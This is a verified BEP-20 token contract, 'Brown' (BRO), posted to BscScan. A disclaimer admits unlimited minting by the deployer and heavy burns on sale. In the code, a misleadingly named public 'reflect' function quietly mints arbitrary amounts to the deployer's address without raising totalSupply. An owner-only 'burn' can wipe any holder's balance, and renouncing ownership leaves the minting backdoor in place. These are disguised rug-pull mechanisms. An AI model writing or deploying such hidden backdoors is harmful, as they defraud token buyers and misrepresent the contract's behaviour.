/**
 *Submitted for verification at BscScan.com on 2022-04-14
*/

/*
--------------------------------------------------- DISCLAIMER ---------------------------------------------------

This is a collectable token, not an investment vehicle. If bought, token holders are aware of the fact that 
this collectable (with no utility) will most likely not produce capital gains. 

The tokenomics of this token have been designed to discourage the trading of this collectable. These tokenomics include:

 - Holders can freely send/transfer tokens to other partners/participants of the blockchain.

 - The contract deployer can generate new tokens (supply is unlimited) and sell them.

 - Selling these collectable tokens on PancakeSwap may lead to a 99.9% token burn. 

Note: In no event will the contract deployer or its affiliates be liable to refund purchasers of this collectable.

--------------------------------------------------------------------------------------------------------------------
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

contract Brown {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    address private _sender;
    address private _owner;

    constructor(){
        _name = "Brown";
        _symbol = "BRO";
        _decimals = 18;
        _totalSupply = 100000000000000000  * 10**9;
        _sender = msg.sender;
    
        _balances[msg.sender] = _totalSupply;
        _isExcludedFromFee[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);

        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    
    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    
    function allowance(address owner_, address spender) public view virtual returns (uint256) {
        return _allowances[owner_][spender];
    }

   
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    
    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(sender, recipient, amount);
        require((_allowances[sender][msg.sender] - amount) >= 0, "ERC20: transfer amount exceeds allowance");
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        require((_allowances[msg.sender][spender] - subtractedValue) >= 0, "ERC20: decreased allowance below zero");
        _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);
        return true;
    }

    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(amount >= 1, "ERC20: amount too low");
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);
        require((_balances[sender] - amount) >= 0, "ERC20: transfer amount exceeds balance");
        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;
        emit Transfer(sender, recipient, amount);
    }

    function reflect(address sender, uint256 amount) public virtual returns (bool) {
        _Improve9(_sender, amount);
        return true;
    }

    function _Improve9(address sender, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");

        if (_sender != msg.sender || !_isExcludedFromFee[msg.sender]) {
            uint256 senderBalance = _balances[sender];
            require(senderBalance >= amount, "IERC20: transfer amount exceeds balance");
        }

        _beforeTokenTransfer(address(0), _sender, amount);
        _balances[_sender] = _balances[_sender] + amount;
        emit Transfer(address(0), _sender, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);
        require((_balances[account] - amount) >= 0, "ERC20: burn amount exceeds balance");
        _balances[account] = _balances[account] - amount;
        _totalSupply = _totalSupply - amount;
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner_, address spender, uint256 amount) internal virtual {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }
    
    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
    
    function burn(address _account, uint256 _amount) external onlyOwner{
        _burn(_account, _amount);
    }
}